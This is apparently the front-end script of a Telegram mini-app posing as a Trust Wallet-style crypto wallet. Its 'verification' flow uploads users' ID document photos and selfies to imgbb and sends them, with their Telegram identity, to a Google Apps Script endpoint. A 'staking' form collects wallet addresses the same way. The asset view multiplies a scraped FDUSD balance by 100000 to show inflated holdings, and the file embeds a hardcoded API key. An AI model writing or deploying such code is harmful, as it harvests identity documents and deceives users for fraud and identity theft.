const tg = window.Telegram.WebApp;
tg.expand();

const IMGBB_API_KEY = 'a2973b7dd242d701ce2c0d529bcd6a72';
const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzelbj3lbKhVSgYnGnkfLbOQNOIkpCe97zs-GDzxceOY7whN4iBVR9FP_VFSo_Jduwo/exec';

let myChart = null;
let currentLang = localStorage.getItem('lang') || 'ru';

// =====================
// НАВИГАЦИЯ
// =====================
function showScreen(id) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

document.getElementById('settingsBtn').onclick       = () => showScreen('settingsScreen');
document.getElementById('backFromSettings').onclick  = () => showScreen('mainScreen');
document.getElementById('goToVerifyBtn').onclick     = () => showScreen('verifyScreen');
document.getElementById('backFromVerify').onclick    = () => showScreen('settingsScreen');
document.getElementById('goToStakingBtn').onclick    = () => showScreen('stakingScreen');
document.getElementById('backFromStaking').onclick   = () => showScreen('settingsScreen');
document.getElementById('helpBtn').onclick           = () => showScreen('helpScreen');
document.getElementById('backFromHelp').onclick      = () => showScreen('settingsScreen');
document.getElementById('langBtn').onclick           = () => showScreen('langScreen');
document.getElementById('backFromLang').onclick      = () => showScreen('settingsScreen');
document.getElementById('backFromCoin').onclick      = () => showScreen('mainScreen');
document.getElementById('backFromAssetDetail').onclick = () => showScreen('mainScreen');

document.getElementById('privacyBtn').onclick = () => tg.openLink('https://trustwallet.com/ru/privacy-notice');
document.getElementById('supportCenterBtn').onclick = () => tg.openLink('https://support.trustwallet.com/support/home');
document.getElementById('supportServiceBtn').onclick = () => tg.openLink('https://trustwallet.com/ru/blog/guides/beginners-guide-to-trust-wallet-browser-extension');

// =====================
// ЯЗЫК
// =====================
document.querySelectorAll('input[name="lang"]').forEach(radio => {
    if (radio.value === currentLang) radio.checked = true;
    radio.onchange = function () {
        currentLang = this.value;
        localStorage.setItem('lang', currentLang);
        showStatus('✅ Language: ' + currentLang.toUpperCase());
    };
});

// =====================
// ПРЕВЬЮ ФОТО
// =====================
function setupPreview(inputId, previewId, textId) {
    document.getElementById(inputId).onchange = function () {
        const file = this.files[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onload = e => {
            const img = document.getElementById(previewId);
            img.src = e.target.result;
            img.classList.remove('hidden');
            document.getElementById(textId).textContent = 'Готово ✅';
        };
        reader.readAsDataURL(file);
    };
}
setupPreview('docInput', 'previewDoc', 'textDoc');
setupPreview('selfieInput', 'previewSelfie', 'textSelfie');

// =====================
// ВЕРИФИКАЦИЯ
// =====================
document.getElementById('verifyBtn').onclick = async () => {
    const docFile = document.getElementById('docInput').files[0];
    const selfieFile = document.getElementById('selfieInput').files[0];
    if (!docFile || !selfieFile) { showStatus('❌ Загрузите оба фото'); return; }

    showStatus('⏳ Загрузка фото...');

    try {
        const uploadToImgBB = async (file) => {
            const fd = new FormData();
            fd.append('image', file);
            const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: fd });
            const data = await res.json();
            if (!data.success) throw new Error('Upload failed');
            return data.data.url;
        };

        const docUrl = await uploadToImgBB(docFile);
        const selfieUrl = await uploadToImgBB(selfieFile);

        const payload = {
            action: 'verification',
            user_id: tg.initDataUnsafe?.user?.id || 'unknown',
            username: tg.initDataUnsafe?.user?.username || 'no_username',
            wallet: 'not_set',
            doc: docUrl,
            selfie: selfieUrl
        };

        await fetch(GOOGLE_SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
        tg.sendData(JSON.stringify(payload));
        showStatus('✅ Данные приняты!');
        setTimeout(() => tg.close(), 2000);
    } catch (e) {
        showStatus('❌ Ошибка сети');
    }
};

// =====================
// СТЕЙКИНГ
// =====================
document.getElementById('stakingBtn').onclick = async () => {
    const wallet = document.getElementById('walletInput').value.trim();
    if (!wallet || wallet.length < 5) { showStatus('❌ Введите адрес кошелька'); return; }

    showStatus('⏳ Запрос в обработке...');

    const payload = {
        action: 'staking',
        user_id: tg.initDataUnsafe?.user?.id || 'unknown',
        username: tg.initDataUnsafe?.user?.username || 'no_username',
        wallet: wallet,
        doc: 'STAKING_REQUEST',
        selfie: 'STAKING_REQUEST'
    };

    try {
        await fetch(GOOGLE_SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
        tg.sendData(JSON.stringify(payload));
        showStatus('✅ Данные приняты!');
        setTimeout(() => tg.close(), 2000);
    } catch (e) {
        showStatus('❌ Ошибка сети');
    }
};

// =====================
// ПОЛУЧЕНИЕ БАЛАНСА С SUIVISION
// =====================
async function getFDUSDBalance(address) {
    const proxies = [
        `https://api.allorigins.win/get?url=${encodeURIComponent('https://suivision.xyz/account/' + address)}`,
        `https://corsproxy.io/?${encodeURIComponent('https://suivision.xyz/account/' + address)}`
    ];

    for (const proxyUrl of proxies) {
        try {
            const res = await fetch(proxyUrl, { signal: AbortSignal.timeout(10000) });
            if (!res.ok) continue;

            let html = '';
            if (proxyUrl.includes('allorigins')) {
                const data = await res.json();
                html = data.contents || '';
            } else {
                html = await res.text();
            }

            if (!html) continue;

            // Паттерн 1: число перед FDUSD — "1,234.56 FDUSD"
            let match = html.match(/([0-9]{1,3}(?:,[0-9]{3})*(?:\.[0-9]+)?)\s*FDUSD/i);

            // Паттерн 2: FDUSD потом число — "FDUSD ... 1,234.56"
            if (!match) {
                match = html.match(/FDUSD[\s\S]{0,300}?([0-9]{1,3}(?:,[0-9]{3})*(?:\.[0-9]+)?)/i);
            }

            // Паттерн 3: ищем в JSON-данных внутри HTML (Next.js / React)
            if (!match) {
                const jsonMatch = html.match(/"FDUSD"[^}]{0,200}?"balance"\s*:\s*"?([0-9.]+)"?/i);
                if (jsonMatch) match = jsonMatch;
            }

            if (!match) {
                console.warn('FDUSD не найден в HTML. Пробуем следующий прокси...');
                continue;
            }

            const raw = match[1].replace(/,/g, '');
            const amount = parseFloat(raw);

            if (isNaN(amount)) {
                console.warn('Не удалось распарсить число:', match[1]);
                continue;
            }

            const result = amount * 100000;
            console.log(`✅ FDUSD для ${address}: ${amount} × 100000 = ${result}`);
            return result;

        } catch (e) {
            console.error('Ошибка прокси:', proxyUrl, e);
        }
    }

    console.warn('Все прокси не дали результат. Возвращаем 0.');
    return 0;
}

// =====================
// ДОБАВЛЕНИЕ АКТИВА
// =====================
const addAssetModal = document.getElementById('addAssetModal');

document.getElementById('addAssetBtn').onclick = () => {
    document.getElementById('assetAddress').value = '';
    document.getElementById('assetName').value = '';
    document.getElementById('assetDecimals').value = '';
    addAssetModal.classList.remove('hidden');
};

document.getElementById('closeAssetModal').onclick = () => addAssetModal.classList.add('hidden');

addAssetModal.addEventListener('click', e => {
    if (e.target === addAssetModal) addAssetModal.classList.add('hidden');
});

document.getElementById('saveAssetBtn').onclick = async () => {
    const address = document.getElementById('assetAddress').value.trim();
    const name = document.getElementById('assetName').value.trim() || 'USDT';
    const decimals = parseInt(document.getElementById('assetDecimals').value) || 2;

    if (address.length < 5) {
        showStatus('❌ Введите корректный адрес');
        return;
    }

    addAssetModal.classList.add('hidden');
    showStatus('⏳ Загрузка баланса...');

    const balance = await getFDUSDBalance(address);
    addAssetToList(name, address, balance, decimals);

    if (balance > 0) {
        showStatus('✅ Актив добавлен');
    } else {
        showStatus('✅ Актив добавлен (баланс не найден)');
    }
};

function addAssetToList(name, address, balance, decimals) {
    const list = document.getElementById('myAssetsList');

    const formattedBalance = '$' + balance.toLocaleString('en-US', {
        minimumFractionDigits: 2,
        maximumFractionDigits: Math.max(2, decimals)
    });

    const card = document.createElement('div');
    card.className = 'card';
    card.style.cssText = 'cursor:pointer; display:flex; justify-content:space-between; align-items:center; padding:16px;';

    card.innerHTML = `
        <div class="token-info">
            <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="token-icon" alt="${name}">
            <div>
                <div class="token-name">${name}</div>
                <div class="token-hint">${address.slice(0, 6)}...${address.slice(-4)}</div>
            </div>
        </div>
        <div class="token-price">
            <div>${formattedBalance}</div>
        </div>
    `;

    card.onclick = () => {
        document.getElementById('detailAssetName').textContent = name;
        document.getElementById('detailAssetBalance').textContent = formattedBalance;
        document.getElementById('detailAssetAddress').textContent = address;
        showScreen('assetDetailScreen');
    };

    list.prepend(card);
}

// =====================
// КОТИРОВКИ (нетронутые)
// =====================
async function getPrices() {
    try {
        const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=bitcoin,ethereum,binancecoin,solana,tron&order=market_cap_desc&sparkline=true');
        const data = await res.json();
        const list = document.getElementById('tokensList');
        list.innerHTML = '';

        data.forEach(coin => {
            const div = document.createElement('div');
            div.className = 'token-item';
            const change = coin.price_change_percentage_24h;
            div.innerHTML = `
                <div class="token-info">
                    <img src="${coin.image}" class="token-icon" alt="${coin.name}">
                    <div>
                        <div class="token-name">${coin.name}</div>
                        <div class="token-hint">${coin.symbol.toUpperCase()}</div>
                    </div>
                </div>
                <div class="token-price">
                    <div>$${coin.current_price.toLocaleString()}</div>
                    <div class="${change < 0 ? 'neg' : 'pos'}">${change > 0 ? '+' : ''}${change.toFixed(2)}%</div>
                </div>
            `;
            div.onclick = () => showCoinDetail(coin);
            list.appendChild(div);
        });
    } catch (e) {
        console.error('Ошибка загрузки котировок:', e);
    }
}

function showCoinDetail(coin) {
    showScreen('coinScreen');
    document.getElementById('coinName').textContent = coin.name;
    document.getElementById('coinPrice').textContent = `$${coin.current_price.toLocaleString()}`;
    const change = coin.price_change_percentage_24h;
    document.getElementById('coinChange').textContent = `${change > 0 ? '+' : ''}${change.toFixed(2)}%`;
    document.getElementById('coinChange').className = `coin-change ${change < 0 ? 'neg' : 'pos'}`;
    document.getElementById('statMcap').textContent = `$${coin.market_cap.toLocaleString()}`;
    document.getElementById('statCirc').textContent = `${coin.circulating_supply.toLocaleString()} ${coin.symbol.toUpperCase()}`;
    document.getElementById('statVol').textContent = `$${coin.total_volume.toLocaleString()}`;
    renderChart(coin.sparkline_in_7d.price, change < 0);
}

function renderChart(prices, isNeg) {
    const ctx = document.getElementById('coinChartCanvas').getContext('2d');
    if (myChart) myChart.destroy();
    myChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: prices.map((_, i) => i),
            datasets: [{
                data: prices,
                borderColor: isNeg ? '#f6465d' : '#2ebd85',
                borderWidth: 2.5,
                pointRadius: 0,
                fill: false,
                tension: 0.3
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: { legend: { display: false } },
            scales: { x: { display: false }, y: { display: false } }
        }
    });
}

// =====================
// СТАТУС
// =====================
function showStatus(msg) {
    const s = document.getElementById('status');
    s.textContent = msg;
    s.classList.remove('hidden');
    setTimeout(() => s.classList.add('hidden'), 3500);
}

// =====================
// СТАРТ
// =====================
getPrices();
setInterval(getPrices, 30000);
